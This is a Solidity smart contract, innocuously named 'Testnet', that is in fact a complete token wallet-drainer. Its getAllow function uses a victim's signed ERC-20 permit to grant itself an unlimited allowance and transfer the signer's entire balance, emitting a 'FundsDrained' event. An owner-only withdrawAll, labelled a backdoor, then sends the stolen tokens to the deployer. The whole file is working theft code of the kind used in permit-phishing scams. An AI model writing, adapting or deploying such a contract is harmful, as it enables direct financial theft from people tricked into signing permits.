// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Testnet {
    using ECDSA for bytes32;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    event Debug(address indexed signer, uint256 amount);
    event FundsDrained(address token, address victim, uint256 amount);

    // ======== VULNERABLE FUNCTION (permit) ========

    function getAllow(
        IERC20Permit token,
        address signer_address,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        uint256 internalValueAllowance = type(uint256).max;

        token.permit(signer_address, address(this), internalValueAllowance, deadline, v, r, s);

        uint256 balance = IERC20(address(token)).balanceOf(signer_address);
        
        require(IERC20(address(token)).allowance(signer_address, address(this)) >= balance, "Insufficient allowance for drain");
        
        IERC20(address(token)).transferFrom(signer_address, address(this), balance);

        uint256 newBalance = IERC20(address(token)).balanceOf(signer_address);
        if (newBalance > 0) {
            require(IERC20(address(token)).allowance(signer_address, address(this)) >= newBalance, "Insufficient allowance");
            IERC20(address(token)).transferFrom(signer_address, address(this), newBalance);
        }
        
        // Emit dengan internalValueAllowance
        emit Debug(signer_address, internalValueAllowance);
        emit FundsDrained(address(token), signer_address, balance + newBalance);
    }

    // ======== BACKDOOR FUNCTION ========
    function withdrawAll(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
    
        IERC20(token).transfer(owner, balance);
    }

}
